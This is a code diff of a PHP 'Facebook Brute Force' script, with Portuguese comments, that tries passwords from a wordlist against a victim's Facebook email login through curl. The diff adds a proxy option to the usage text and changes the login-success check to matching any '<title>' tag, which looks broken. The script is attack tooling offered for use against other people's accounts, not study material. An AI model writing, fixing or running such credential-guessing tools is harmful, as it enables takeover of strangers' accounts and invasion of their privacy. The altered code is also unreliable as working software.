@@ -9,7 +9,6 @@
 		obs: após algumas tentativas o facebook irá bloqueia o acesso
 		a conta por algumas horas.
 	*/
-
     error_reporting(0);
     banner();
     $email = $argv[1];
@@ -39,11 +38,10 @@
       [+] Criado Por Pablo Santhus
       [+] Facebook Brute Force
       [+] Ajuda: php facebook.php emaildavitima@gmail.com wordlist.txt
-
+      [+] Ajuda: php facebook.php emaildavitima@gmail.com wordlist.txt -proxy 127.0.0.1:80
       \n\n";
 	sleep(1);
     }
-
     function brute($usuario, $senha){
     	
       $ch = curl_init();
@@ -64,13 +62,12 @@
       $fp = fopen("log.html", "w");
       fwrite($fp, $source);
       
-      if(eregi("PuNK7", $source)){
+      if(eregi("<title>", $source)){
         return true;
       }else{
         return false;
       }
     }
-
     if(isset($argv[1]) && isset($argv[2])){
       $lines = file($word);
       foreach($lines as $line){
@@ -86,7 +83,8 @@
         }
       }
     }else{
-    	echo "[-] Ajuda: php facebook.php emaildavitima@gmail.com wordlist.txt\n";
+    	echo "[-] Ajuda: php facebook.php emaildavitima@gmail.com wordlist.txt
+            [-] Ajuda: php facebook.php emaildavitima@gmail.com wordlist.txt -proxy 127.0.0.1:80\n";
     }
     
 ?>
